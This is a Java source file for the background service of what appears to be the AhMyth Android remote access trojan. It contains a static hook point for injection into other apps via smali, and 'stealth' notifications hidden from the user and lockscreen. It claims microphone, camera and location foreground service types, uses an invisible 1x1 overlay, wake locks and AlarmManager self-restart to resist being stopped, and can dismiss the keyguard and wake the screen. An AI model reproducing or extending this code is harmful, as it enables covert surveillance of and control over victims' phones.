package ahmyth.mine.king.ahmyth;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Color;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.support.v4.app.NotificationCompat;
import android.util.Log;
import android.app.KeyguardManager;
import android.view.WindowManager;

import java.lang.reflect.Method;

public class MainService extends Service {
    
    private static final String TAG = "AhMythService";
    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "ahmyth_service_channel";
    
    // Overlay view for foreground persistence (1px transparent)
    private android.view.WindowManager windowManager;
    private android.view.View overlayView;
    
    private static Context contextOfApplication;
    private static MainService instance;
    private PowerManager.WakeLock wakeLock;
    private boolean isRunning = false;
    
    public static MainService getInstance() {
        return instance;
    }

    private static void findContext() throws Exception {
        Class<?> activityThreadClass;
        try {
            activityThreadClass = Class.forName("android.app.ActivityThread");
        } catch (ClassNotFoundException e) {
            return;
        }

        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
        if (context == null) {
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                public void run() {
                    try {
                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
                        if (context != null) {
                            startService(context);
                        }
                    } catch (Exception ignored) {
                    }
                }
            });
        } else {
            startService(context);
        }
    }

    // Smali hook point
    public static void start() {
        try {
            Log.d(TAG, "Static start() called");
            findContext();
        } catch (Exception e) {
            Log.e(TAG, "Error in start()", e);
        }
    }

    public static void startService(Context context) {
        try {
            Log.d(TAG, "startService called");
            Intent intent = new Intent(context, MainService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting service", e);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service onCreate");
        instance = this;
        contextOfApplication = this;
        
        // CRITICAL: For Android 12+, we MUST call startForeground() immediately in onCreate()
        // to prevent ForegroundServiceDidNotStartInTimeException when started via AlarmManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            Log.d(TAG, "Android 12+ detected - calling startForeground immediately in onCreate");
            startForegroundWithNotification();
        }
        
        // Acquire wake lock to keep service running (if enabled)
        if (StealthConfig.WAKE_LOCK) {
            acquireWakeLock();
        }
        
        // Create 1px overlay if permission granted
        createOverlay();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
        Log.d(TAG, "Service onStartCommand - SDK: " + Build.VERSION.SDK_INT);
        
        // Ensure overlay exists
        if (overlayView == null) {
            createOverlay();
        }

        // Always update context to Service context to avoid holding onto dead Activity context
        try {
            if (ConnectionManager.context instanceof android.app.Activity) {
                Log.d(TAG, "Updating ConnectionManager context to Service context");
                ConnectionManager.context = this;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error updating context", e);
        }

        if (isRunning) {
            Log.d(TAG, "Service already running");
            // Re-acquire wake lock if it was lost (important for MIUI)
            if (StealthConfig.WAKE_LOCK && (wakeLock == null || !wakeLock.isHeld())) {
                Log.d(TAG, "Wake lock lost, re-acquiring...");
                acquireWakeLock();
            }
            // Return START_STICKY only if PERSISTENT_SERVICE is enabled
            return StealthConfig.PERSISTENT_SERVICE ? Service.START_STICKY : Service.START_NOT_STICKY;
        }
        
        isRunning = true;
        contextOfApplication = this;
        
        // Ensure wake lock is acquired (re-acquire if lost)
        if (StealthConfig.WAKE_LOCK && (wakeLock == null || !wakeLock.isHeld())) {
            Log.d(TAG, "Acquiring wake lock in onStartCommand...");
            acquireWakeLock();
        }
        
        // Start foreground immediately to prevent ANR
        startForegroundWithNotification();
        
        // Start the connection manager
        try {
            Log.d(TAG, "Starting ConnectionManager");
            ConnectionManager.startAsync(this);
        } catch (Exception e) {
            Log.e(TAG, "Error starting ConnectionManager", e);
        }
        
        // Return START_STICKY only if PERSISTENT_SERVICE is enabled
        // This ensures the system restarts the service if killed, but only when persistence is enabled
        return StealthConfig.PERSISTENT_SERVICE ? Service.START_STICKY : Service.START_NOT_STICKY;
    }

    private void startForegroundWithNotification() {
        Log.d(TAG, "Starting foreground notification");
        
        try {
            // Create notification channel for Android 8+
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                createNotificationChannel();
            }
            
            // Build notification - use minimal/silent notification if in stealth mode
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID);
            
            if (StealthConfig.SILENT_NOTIFICATION) {
                // Ultra-minimal notification for stealth
                builder.setContentTitle("")
                    .setContentText("")
                    .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setCategory(NotificationCompat.CATEGORY_SERVICE)
                    .setOngoing(true)
                    .setShowWhen(false)
                    .setAutoCancel(false)
                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                    .setSound(null)
                    .setVibrate(null);
            } else {
                // Normal notification
                builder.setContentTitle("System Service")
                    .setContentText("Running in background")
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .setCategory(NotificationCompat.CATEGORY_SERVICE)
                    .setOngoing(true)
                    .setShowWhen(false)
                    .setAutoCancel(false);
            }
            
            // Add pending intent to open app
            Intent notificationIntent = new Intent(this, MainActivity.class);
            PendingIntent pendingIntent;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            } else {
                pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 
                    PendingIntent.FLAG_UPDATE_CURRENT);
            }
            builder.setContentIntent(pendingIntent);
            
            Notification notification = builder.build();
            
            // Start foreground with appropriate service type for Android 10+
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                // Android 14+ requires specific foreground service types
                startForeground(NOTIFICATION_ID, notification, 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC | 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA |
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Android 10-13
                startForeground(NOTIFICATION_ID, notification, 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC | 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA |
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
            } else {
                // Android 9 and below
                startForeground(NOTIFICATION_ID, notification);
            }
            
            Log.d(TAG, "Foreground notification started successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting foreground", e);
            // Fallback for older devices
            try {
                startForeground(NOTIFICATION_ID, new Notification());
            } catch (Exception e2) {
                Log.e(TAG, "Fallback foreground failed", e2);
            }
        }
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Use minimal importance in stealth mode
            int importance = StealthConfig.SILENT_NOTIFICATION ? 
                NotificationManager.IMPORTANCE_MIN : 
                NotificationManager.IMPORTANCE_LOW;
            
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                StealthConfig.SILENT_NOTIFICATION ? " " : "Background Service",
                importance
            );
            
            channel.setDescription("");
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            channel.setShowBadge(false);
            channel.enableLights(false);
            channel.enableVibration(false);
            channel.setSound(null, null);
            channel.setBypassDnd(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
                Log.d(TAG, "Notification channel created (stealth: " + StealthConfig.SILENT_NOTIFICATION + ")");
            }
        }
    }
    
    private void acquireWakeLock() {
        // Only acquire wake lock if WAKE_LOCK is enabled
        if (!StealthConfig.WAKE_LOCK) {
            Log.d(TAG, "WAKE_LOCK is disabled, not acquiring wake lock");
            return;
        }
        
        try {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (powerManager != null) {
                // Release old wake lock if exists
                if (wakeLock != null && wakeLock.isHeld()) {
                    try {
                        wakeLock.release();
                    } catch (Exception e) {
                        Log.w(TAG, "Error releasing old wake lock", e);
                    }
                }
                
                // Create new wake lock with reference counting for MIUI compatibility
                wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "AhMyth::ServiceWakeLock"
                );
                
                // Set as reference counted so it can be re-acquired (important for MIUI)
                wakeLock.setReferenceCounted(true);
                
                // Acquire with very long timeout (1 hour) - MIUI may kill it anyway, but this helps
                // Using acquire() without timeout would be better, but MIUI might reject it
                wakeLock.acquire(60*60*1000L); // 1 hour timeout
                
                Log.d(TAG, "Wake lock acquired (WAKE_LOCK enabled, reference counted)");
                
                // Re-acquire periodically to keep it alive on MIUI (every 5 minutes)
                Handler handler = new Handler(Looper.getMainLooper());
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (StealthConfig.WAKE_LOCK && wakeLock != null && !wakeLock.isHeld()) {
                            try {
                                wakeLock.acquire(60*60*1000L);
                                Log.d(TAG, "Wake lock re-acquired (periodic refresh)");
                            } catch (Exception e) {
                                Log.e(TAG, "Error re-acquiring wake lock", e);
                            }
                        }
                        // Schedule next check in 5 minutes
                        if (isRunning && StealthConfig.WAKE_LOCK) {
                            handler.postDelayed(this, 5*60*1000L);
                        }
                    }
                }, 5*60*1000L); // First check in 5 minutes
            }
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring wake lock", e);
        }
    }
    
    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                Log.d(TAG, "Wake lock released");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error releasing wake lock", e);
        }
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "Service onDestroy");
        isRunning = false;
        
        // Schedule restart BEFORE releasing wake lock and removing overlay
        // This ensures the service can restart even if killed
        if (StealthConfig.PERSISTENT_SERVICE) {
            Log.d(TAG, "PERSISTENT_SERVICE enabled, scheduling restart");
            
            // Use AlarmManager to ensure restart even if process is killed
            try {
                android.app.AlarmManager alarmManager = (android.app.AlarmManager) getSystemService(Context.ALARM_SERVICE);
                if (alarmManager != null) {
                    android.content.Intent restartIntent = new android.content.Intent(this, MainService.class);
                    android.app.PendingIntent pendingIntent;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        pendingIntent = android.app.PendingIntent.getService(
                            this, 0, restartIntent, 
                            android.app.PendingIntent.FLAG_ONE_SHOT | android.app.PendingIntent.FLAG_IMMUTABLE
                        );
                    } else {
                        pendingIntent = android.app.PendingIntent.getService(
                            this, 0, restartIntent, 
                            android.app.PendingIntent.FLAG_ONE_SHOT
                        );
                    }
                    // Schedule restart in 2 seconds
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        alarmManager.setExactAndAllowWhileIdle(
                            android.app.AlarmManager.RTC_WAKEUP,
                            System.currentTimeMillis() + 2000,
                            pendingIntent
                        );
                    } else {
                        alarmManager.set(android.app.AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 2000, pendingIntent);
                    }
                    Log.d(TAG, "Scheduled service restart via AlarmManager");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error scheduling restart", e);
            }
        }
        
        releaseWakeLock();
        
        // Remove overlay
        removeOverlay();
        
        if (StealthConfig.PERSISTENT_SERVICE) {
            scheduleRestart();
        } else {
            Log.d(TAG, "PERSISTENT_SERVICE disabled, not scheduling restart");
        }
        
        super.onDestroy();
    }
    
    private void createOverlay() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && 
                !android.provider.Settings.canDrawOverlays(this)) {
                Log.w(TAG, "Cannot create overlay - permission missing");
                return;
            }
            
            if (overlayView != null) {
                return; // Already created
            }
            
            windowManager = (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
            
            int type = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ?
                android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                android.view.WindowManager.LayoutParams.TYPE_PHONE;
                
            android.view.WindowManager.LayoutParams params = new android.view.WindowManager.LayoutParams(
                1, 1, // 1x1 pixel
                type,
                android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                android.view.WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                android.graphics.PixelFormat.TRANSLUCENT
            );
            
            params.gravity = android.view.Gravity.TOP | android.view.Gravity.START;
            params.x = 0;
            params.y = 0;
            // Must be > 0.0 for system to consider it "visible" for some background checks
            // But still invisible to human eye
            params.alpha = 0.01f; 
            
            overlayView = new android.view.View(this);
            overlayView.setBackgroundColor(Color.TRANSPARENT);
            
            windowManager.addView(overlayView, params);
            Log.d(TAG, "1x1 Overlay created successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error creating overlay", e);
        }
    }
    
    private void removeOverlay() {
        try {
            if (windowManager != null && overlayView != null) {
                windowManager.removeView(overlayView);
                overlayView = null;
                Log.d(TAG, "Overlay removed");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error removing overlay", e);
        }
    }

    public static Context getContextOfApplication() {
        return contextOfApplication;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.d(TAG, "Task removed");
        
        // Schedule restart only if PERSISTENT_SERVICE is enabled
        if (StealthConfig.PERSISTENT_SERVICE) {
            Log.d(TAG, "PERSISTENT_SERVICE enabled, scheduling restart");
            scheduleRestart();
        } else {
            Log.d(TAG, "PERSISTENT_SERVICE disabled, not scheduling restart");
        }
    }
    
    private void scheduleRestart() {
        // Double-check PERSISTENT_SERVICE setting before scheduling
        if (!StealthConfig.PERSISTENT_SERVICE) {
            Log.d(TAG, "PERSISTENT_SERVICE is disabled, not scheduling restart");
            return;
        }
        
        try {
            Intent restartServiceIntent = new Intent(getApplicationContext(), MainService.class);
            restartServiceIntent.setPackage(getPackageName());
            
            PendingIntent restartServicePendingIntent;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                restartServicePendingIntent = PendingIntent.getService(
                    getApplicationContext(), 1001, restartServiceIntent,
                    PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
                );
            } else {
                restartServicePendingIntent = PendingIntent.getService(
                    getApplicationContext(), 1001, restartServiceIntent,
                    PendingIntent.FLAG_ONE_SHOT
                );
            }
            
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (alarmManager != null) {
                long triggerTime = System.currentTimeMillis() + 1000;
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    // Android 12+ requires permission for exact alarms
                    if (alarmManager.canScheduleExactAlarms()) {
                        alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, restartServicePendingIntent);
                        Log.d(TAG, "Restart scheduled (exact alarm, Android 12+)");
                    } else {
                        alarmManager.set(AlarmManager.RTC_WAKEUP, triggerTime, restartServicePendingIntent);
                        Log.d(TAG, "Restart scheduled (inexact alarm, Android 12+, no permission)");
                    }
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, restartServicePendingIntent);
                    Log.d(TAG, "Restart scheduled (exact, allow while idle, Android 6+)");
                } else {
                    alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, restartServicePendingIntent);
                    Log.d(TAG, "Restart scheduled (exact, Android < 6)");
                }
            } else {
                Log.e(TAG, "AlarmManager is null, cannot schedule restart");
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception scheduling restart (may need SCHEDULE_EXACT_ALARM permission)", e);
            // Try fallback with inexact alarm
            try {
                AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
                if (alarmManager != null) {
                    Intent restartServiceIntent = new Intent(getApplicationContext(), MainService.class);
                    restartServiceIntent.setPackage(getPackageName());
                    PendingIntent pendingIntent = PendingIntent.getService(
                        getApplicationContext(), 1001, restartServiceIntent,
                        Build.VERSION.SDK_INT >= Build.VERSION_CODES.S 
                            ? PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
                            : PendingIntent.FLAG_ONE_SHOT
                    );
                    alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 2000, pendingIntent);
                    Log.d(TAG, "Restart scheduled (fallback inexact alarm)");
                }
            } catch (Exception e2) {
                Log.e(TAG, "Fallback restart scheduling also failed", e2);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling restart", e);
        }
    }
    
    @Override
    public void onLowMemory() {
        super.onLowMemory();
        Log.w(TAG, "Low memory warning");
    }
    
    @Override
    public void onTrimMemory(int level) {
        super.onTrimMemory(level);
        Log.d(TAG, "Trim memory level: " + level);
    }

    public void wakeScreen() {
        Log.d(TAG, "Waking screen up...");
        try {
            // Get power manager
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (powerManager == null) {
                Log.e(TAG, "Failed to get PowerManager");
                return;
            }

            // Acquire a screen-bright wake lock
            PowerManager.WakeLock wakeLock = powerManager.newWakeLock(
                PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
                PowerManager.ACQUIRE_CAUSES_WAKEUP |
                PowerManager.ON_AFTER_RELEASE,
                "AhMyth::ScreenWakeLock"
            );
            wakeLock.acquire(10000); // 10 second timeout

            // Dismiss keyguard
            KeyguardManager keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
            if (keyguardManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    keyguardManager.requestDismissKeyguard(null, null);
                } else {
                    KeyguardManager.KeyguardLock keyguardLock = keyguardManager.newKeyguardLock("AhMyth");
                    keyguardLock.disableKeyguard();
                }
            }

            // Bring MainActivity to front
            Intent intent = new Intent(this, MainActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            startActivity(intent);

            // Release wake lock after a short delay
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                if (wakeLock.isHeld()) {
                    wakeLock.release();
                    Log.d(TAG, "Screen wake lock released");
                }
            }, 5000);

        } catch (Exception e) {
            Log.e(TAG, "Error waking screen", e);
        }
    }
}
